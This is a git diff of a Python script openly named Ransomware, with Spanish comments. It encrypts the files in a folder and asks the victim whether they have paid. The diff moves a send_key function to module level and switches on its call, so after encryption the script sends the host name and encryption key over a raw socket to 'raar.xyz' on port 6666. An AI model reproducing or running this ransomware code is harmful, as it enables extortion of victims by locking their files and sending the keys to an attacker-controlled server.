@@ -132,7 +132,7 @@ class Ransomware:
                 break
             if key != self.key:
                 print('Llave incorrecta. Ya pagaste?\n')
-            
+
 
         files = self.get_files_in_folder(path)
 
@@ -147,26 +147,14 @@ class Ransomware:
 
         return num_decrypted_files
 
-    def send_key(hostname, key):
 
-        flag = False
-        #Conectarse a servidor de ransomware para enviar nombre del host y llave
-        ip_address = 'raar.xyz' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
-        port = 6666
-        ttime = datetime.datetime.now()
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((ip_address, port))
-            s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))
-        flag = True
-
-        return flag
     def generate_random_password(self,characters):
         ## length of password from the user
         length = int(input("Indique largo de la contraseña: "))
 
         ## shuffling the characters
         random.shuffle(characters)
-        
+
         ## picking random characters from the list
         password = []
         for i in range(length):
@@ -181,6 +169,19 @@ class Ransomware:
         print("".join(password))
         print("\n\n")
 
+def send_key(hostname, key):
+
+    flag = False
+    #Conectarse a servidor de ransomware para enviar nombre del host y llave
+    ip_address = 'raar.xyz' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
+    port = 6666
+    ttime = datetime.datetime.now()
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((ip_address, port))
+        s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))
+    flag = True
+
+    return flag
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
@@ -210,8 +211,8 @@ if __name__ == '__main__':
     number_encrypted_files = ransomware.encrypt_files_in_folder(key, path)
     print('Number of encrypted files: {}'.format(number_encrypted_files))
 
-    #hostname = socket.gethostname()
-    #send_key(hostname, key)
+    hostname = socket.gethostname()
+    send_key(hostname, key)
 
     # Decrypt files located in the given directory
     number_decrypted_files = ransomware.decrypt_files_in_folder(path)
